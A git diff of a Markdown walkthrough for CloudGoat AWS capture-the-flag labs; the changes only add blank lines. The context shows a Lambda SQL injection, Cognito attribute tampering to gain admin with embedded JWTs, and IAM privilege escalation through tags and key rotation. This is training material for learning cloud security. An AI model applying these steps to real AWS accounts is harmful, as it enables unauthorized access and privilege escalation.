@@ -142,6 +142,7 @@ Result:
 Result: 
 ![Policy Function](images/sns_secrets/image4.png)
 Scrolling down, we can see the functions that the policy holds
+
 ![Functions](images/sns_secrets/image5.png)
 
 3. Let's breakdown the actions. SNS is similiar to [GCP pub/sub topic](https://cloud.google.com/pubsub/docs/create-topic). As such, we know the actions user can subscribe, receive and list topics. Using PACU, it can help automate the enumeration process.
@@ -244,11 +245,14 @@ Set session token into new profile
 7. Using the new profile, list all functions
 `aws --profile cloudgoat --region us-east-1 lambda list-functions`
 Result:
+
 ![list function](images/vulnerable_lambda/image8.png)
 
 8. Check function description. Notice that function communicate with database.
+
 ![Function description](images/vulnerable_lambda/image9.png)
 Scrolling down, notice that there's a URL to download the function source code.
+
 ![Function source code](images/vulnerable_lambda/image10.png)
 
 9. Download source code and rename it to a zip file format.
@@ -274,6 +278,7 @@ Let's break down the source code.
 - Unsafe sink for SQL injection is found. By injecting SQL payload here will negate **public='True'**
 ![source code 2](images/vulnerable_lambda/image12.png)
 - The structure of the payload is as such
+
 ![source code 3](images/vulnerable_lambda/image13.png)
 
 11. With all the information given, we can craft a SQL payload to grant bilbo administrator access. Create a .json file name **payload.json** and insert the following contents. 
@@ -293,6 +298,7 @@ Let's break down the source code.
       cat out.txt
       ```
    Result
+
    ![payload](images/vulnerable_lambda/image15.png)
 
 13. List secret and get flag
@@ -321,7 +327,9 @@ Contributed by [TrustOnCloud.](https://trustoncloud.com/)
 #### Walkthrough
 1. Enumerating through the site, there are 2 pages - login and signup page. 
 ![signup](images/vulnerable_cognito/image1.png)
+
 An error message will surface during a sign up as such.
+
 ![](images/vulnerable_cognito/image2.png)
 
 2. Dig a little into the source code and you'll find some useful information as such.
@@ -334,6 +342,7 @@ An error message will surface during a sign up as such.
    ","Value":"test01"},{"Name":"family_name","Value":"test01"}]'
    ```
    Confirmation code sent after signing up
+
    ![](images/vulnerable_cognito/image6.png)
 
 4. Obtain the 2FA from email and send confirmation
@@ -342,6 +351,7 @@ An error message will surface during a sign up as such.
    ```
 
 5. Once sign up is complete, login with your new credentials
+
 ![](images/vulnerable_cognito/image7.png)
 
 6. Login success! However, you do not have admin access. There are no other paths in the web application.
@@ -351,9 +361,11 @@ Looking into localstorage, you will find a access code. This is issued to user u
    aws cognito-idp get-user --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --region us-east-1
    ```
    Result: 
+
    ![](images/vulnerable_cognito/image9.png)
 
    Using JWT decode:
+
    ![](images/vulnerable_cognito/image10.png)
 
 7. Referencing from [AWS-CLI Cognito documentation](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-attributes.html), update custom attribute **custom:access** to **admin**
@@ -366,12 +378,14 @@ Looking into localstorage, you will find a access code. This is issued to user u
    aws cognito-idp get-user --access-token eyJraWQiOiJZdGpYU0h5WGU1bVpDb2lScTI3WkgxdWxwdlRcLzZlOU5HbHFDcFIwbmN4az0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9xVm1SNU40a2giLCJjbGllbnRfaWQiOiIyOHBwcDhsc2Q4dHIwYXJpcTJiZzN1Mm9ucSIsIm9yaWdpbl9qdGkiOiJmN2JmNGVmOC1mNDlkLTRmMjMtYmZjNy0wNzYxMTY2MzZkOTkiLCJldmVudF9pZCI6ImM2YmZjODE4LWFmMGItNGVhMi1iNzlmLWJmZmE0NTBmMGMzMiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3Mzc2NDI4MDQsImV4cCI6MTczNzY0NjQwNCwiaWF0IjoxNzM3NjQyODA0LCJqdGkiOiI5YjYzYWI3YS1jYzQ1LTRhMmQtOGZiMS02N2FkZGEwNWUwYWIiLCJ1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSJ9.usKVO02NZokIk6gLLnqo_22eT5mqdB29moUvYqdAzszi5VxCs9UruYtGyvmd5kuGyxiHFXW_DktWjLgpg2Z-ga1bmBJJHOlaahapBeSzU8sUgTq8tslqyUI_76GTwwjcpNJDYErpr5YHW_rwc9g-ToH-QzI3CohW0w203kHw-teXI6m_PSrZaMuBMIGCyZxzbgwuC4OPjQLdAFZ4GFpV_DAlxw3SJdh_0QzFKnOKmj3Q6XomBMSdjzCvAvDgorqR409GoaFiAjkJRK6cdGm7tehjon90muZq5zmrY_fbifWGKuuSvnL_BC0UUs-H6QzrZaEPaV2NDLajnMXKpi-x2Q --region us-east-1
    ```
    Result:
+
    ![](images/vulnerable_cognito/image13.png)
 
 9. Relogging in will grant user admin access.
 ![](images/vulnerable_cognito/image14.png)
 
 10. View source page get **IdentityPoolId**
+
 ![](images/vulnerable_cognito/image15.png)
 
 11. Using new information, get identity id as such
@@ -383,6 +397,7 @@ Looking into localstorage, you will find a access code. This is issued to user u
    aws cognito-identity get-id --region us-east-1 --identity-pool-id us-east-1:e0779a64-39ab-4de3-8347-567bd4fe7e30 --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_qVmR5N4kh=eyJraWQiOiJmZkpqYXNrcGIxNDRRN2RZVlVzTk9SSkFSWmFNZDVXa3VnWDB6bTQyaUVvPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzNGY4OTQwOC1iMDMxLTcwZTMtMTY0OC0yZDI4MzEzYjJiOTUiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfcVZtUjVONGtoIiwiY29nbml0bzp1c2VybmFtZSI6IjM0Zjg5NDA4LWIwMzEtNzBlMy0xNjQ4LTJkMjgzMTNiMmI5NSIsImdpdmVuX25hbWUiOiJ0ZXN0MDEiLCJjdXN0b206YWNjZXNzIjoiYWRtaW4iLCJvcmlnaW5fanRpIjoiNGFiMWExNTAtMGRmNC00MTRhLWI5MWMtYWU0N2MyYmZjMTUzIiwiYXVkIjoiMjhwcHA4bHNkOHRyMGFyaXEyYmczdTJvbnEiLCJldmVudF9pZCI6IjVhYjdlYmIyLWNhMzItNGM4Zi04YTAzLTQyZDU5ODJmYzIwYyIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzM3NjQ0NDg3LCJleHAiOjE3Mzc2NDgwODcsImlhdCI6MTczNzY0NDQ4NywiZmFtaWx5X25hbWUiOiJ0ZXN0MDEiLCJqdGkiOiJmNTliYjVmYS00MDIwLTQyYzEtYjA4ZS00MDQ4NTA0ODBhNzMiLCJlbWFpbCI6Inpvdnl0ZW11QHRlbGVnLmV1In0.hgGGTqrCBhyU0a1-FTP2wh4ARXx2iQSlUhLWzsy-xDqrWvGfhKfJAVlcy2ICP_ys9u14A2r-LGDZu65I0WlYxIHSh3apilgUGeol4NhB2YmtczCiyc1JD_7aOPJiCn5WNnnLpGxy_5jQBb5Ahbyg1Y0RWjt1AZYsx9tJXS1sig_-kpJL0A24fpkG9pKOyymivXZ2wuBM06fO9C4nxpgKeFjxtri_vk3j12d1W9jvg0ydFkXpFrJDSCfztD2Gisd18H3MDLpQsLkCYRUsOzpWDoyUT9S-SMIq1RInIr9vB6CKsvob5Mh-53UJ8we7jBqRaFoghN4cBZZFm-6o0nLItQ"
    ```
    Result:
+
    ![](images/vulnerable_cognito/image17.png)
 
 12. With identity ID, we can obtain credentials as such
@@ -420,6 +435,7 @@ Contributed by [infrasec.sh](https://infrasec.sh/).
 3. Run this command to verify if profile has been setup (akin to whoami) `aws sts get-caller-identity --profile manager`
 
    Result:
+
    ![](images/iam_privesc_by_key_rotation/image1.png)
 
 #### Walkthrough
@@ -434,6 +450,7 @@ Contributed by [infrasec.sh](https://infrasec.sh/).
    aws --profile manager iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name SelfManageAccess
    ```
    Policy have IAM actions to perform CRUD on MFA devices and access keys. Performing CRUD actions require **ResourceTag/Developer == TRUE**
+
    ![](images/iam_privesc_by_key_rotation/image3.png)
 
 **TagResources**
@@ -442,6 +459,7 @@ Contributed by [infrasec.sh](https://infrasec.sh/).
    ```
    Policy have IAM actions to perform CRUD on tags.
    ![](images/iam_privesc_by_key_rotation/image4.png)
+
 3. Enumerate all users
    ```
    aws iam list-users --profile manager
@@ -460,12 +478,15 @@ Check Admin policy
    ```
    Attached User Policy: Admin only have **IAMReadOnlyAccess**
    ![](images/iam_privesc_by_key_rotation/image6.png)
+
    Check user policy
    ```
    aws --profile manager iam list-user-policies --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91
    ```
    User Policy: Admin can **AssumeRoles**
+
    ![](images/iam_privesc_by_key_rotation/image7.png)
+
    Check **AssumeRoles** action:
    ```
    aws --profile manager iam get-user-policy --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name AssumeRoles
@@ -505,18 +526,23 @@ Check attached policies
    aws iam list-attached-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
    ```
    Result: None
+
    ![](images/iam_privesc_by_key_rotation/image13.png)
+
    Check user policies
    ```
    aws --profile manager iam list-user-policies --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91
    ```
    Result: **DeveloperViewSecrets**
+
    ![](images/iam_privesc_by_key_rotation/image14.png)
+
    Check **DeveloperViewSecrets** actions
    ```
    aws --profile manager iam get-user-policy --user-name developer_iam_privesc_by_key_rotation_cgidm3vx44qe91 --policy-name DeveloperViewSecrets
    ```
    Result: Allow **ListSecrets**
+
    ![](images/iam_privesc_by_key_rotation/image15.png)
 
 7. Here are the information we have gathered thus far
@@ -542,8 +568,9 @@ Manager will add **developer** tag to admin → Manager create new access key fo
    aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --profile manager
    ```
    Result: 2 existing keys were found
-   
+
    ![](images/iam_privesc_by_key_rotation/image17.png)
+
    Delete 1 of the access key
    ```
    aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_cgidm3vx44qe91 --access-key-id AKIAXZ5NGHKIV3ZJ7HPP --profile manager
@@ -561,6 +588,7 @@ Manager will add **developer** tag to admin → Manager create new access key fo
    ```
    Result: A MFA serial number is formed. A QR code is generated in the same file path
    ![](images/iam_privesc_by_key_rotation/image19.png)
+
    Scan the TOTP using an authenticator app an insert the OTP
    ```
    aws --profile manager iam enable-mfa-device \
